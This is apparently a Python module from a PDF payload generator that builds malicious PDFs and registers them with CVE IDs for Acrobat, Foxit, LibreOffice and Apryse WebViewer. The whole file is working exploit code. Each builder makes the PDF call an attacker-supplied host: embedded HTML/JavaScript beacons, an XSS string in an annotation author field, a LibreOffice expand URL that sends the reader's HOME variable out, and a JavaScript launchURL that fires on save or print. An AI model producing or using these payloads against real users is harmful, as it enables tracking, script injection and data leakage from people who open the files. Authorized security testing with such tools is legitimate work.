from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def build_richmedia_csp(host: str) -> bytes:
    html = (
        '<html><body><script>'
        f'var i=new Image(1,1);i.src="{host}/m-richmedia";'
        '</script></body></html>'
    ).encode()
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [6 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (richmedia) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Filespec /F (nonpdf.html) /EF << /F 7 0 R >> /AFRelationship /Alternative >>\nendobj\n"
        + b"6 0 obj\n<< /Type /Annot /Subtype /RichMedia /Rect [0 0 0 0]"
        + b" /RichMediaSettings << /Activation << /Condition /PO >> >>"
        + b" /RichMediaContent << /Assets << /Names [(nonpdf.html) 5 0 R] >>"
        + b" /Configurations [<< /Subtype /HTML /Instances [<< /Asset 5 0 R >>] >>] >> >>\nendobj\n"
        + b"7 0 obj\n<< /Type /EmbeddedFile /Subtype /text#2Fhtml /Length "
        + str(len(html)).encode() + b" >>\nstream\n" + html + b"\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 8 >>\n%%EOF\n"
    )


def build_af_html(host: str) -> bytes:
    html = (
        '<html><body><script>'
        f'var i=new Image(1,1);i.src="{host}/m-af";'
        '</script></body></html>'
    ).encode()
    head = b"%PDF-2.0\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AF [5 0 R] /Version /2.0 >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (af-embed) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Filespec /F (nonpdf.html) /UF (nonpdf.html) /EF << /F 6 0 R >> /AFRelationship /Supplement >>\nendobj\n"
        + b"6 0 obj\n<< /Type /EmbeddedFile /Subtype /text#2Fhtml /Length "
        + str(len(html)).encode() + b" >>\nstream\n" + html + b"\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 7 >>\n%%EOF\n"
    )


def build_annot_xss(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [5 0 R] /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (annot-xss) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Annot /Subtype /Text /Rect [100 700 300 750]"
        + b" /T (<img src=\"" + host.encode() + b"/m-annot\">)"
        + b" /Contents (note) /Open true /C [1 1 0] >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_lo_expand(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (lo-expand) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /Action /S /URI /URI (vnd.sun.star.expand:"
        + host.encode() + b"/m-lo?v=${HOME}) >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_foxit_ocg(host: str) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R"
        + b" /OCProperties << /OCGs [5 0 R] /D << /ON [5 0 R] /OFF [] /BaseState /ON >> >>"
        + b" /AA << /WP 6 0 R /DP 6 0 R >> >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (foxit-ocg) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Type /OCG /Name (Layer1) /Intent /View >>\nendobj\n"
        + b"6 0 obj\n<< /Type /Action /S /JavaScript /JS (app.launchURL(\""
        + host.encode() + b"/m-foxit\", true)) >>\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 7 >>\n%%EOF\n"
    )


registry.register(PayloadEntry(
    id="M01", name="richmedia_html",
    builder=lambda host: build_richmedia_csp(host),
    description="RichMedia annot embedded HTML/JS (CSP bypass)",
    platform="acrobat", cve="CVE-2022-28244", tags=("embed",),
))
registry.register(PayloadEntry(
    id="M02", name="af_html",
    builder=lambda host: build_af_html(host),
    description="PDF 2.0 /AF Associated Files embedded HTML beacon",
    platform="all", tags=("embed",),
))
registry.register(PayloadEntry(
    id="M03", name="annot_xss",
    builder=lambda host: build_annot_xss(host),
    description="Text annot /T author DOM XSS (Apryse WebViewer)",
    platform="server", cve="CVE-2025-70401", tags=("embed",),
))
registry.register(PayloadEntry(
    id="M04", name="lo_expand",
    builder=lambda host: build_lo_expand(host),
    description="vnd.sun.star.expand URL env var leak (LibreOffice)",
    platform="server", cve="CVE-2024-12426", tags=("embed",),
))
registry.register(PayloadEntry(
    id="M05", name="foxit_ocg",
    builder=lambda host: build_foxit_ocg(host),
    description="Foxit OCG /AA /WP /DP trigger during signing",
    platform="acrobat", cve="CVE-2025-59803", tags=("embed",),
))
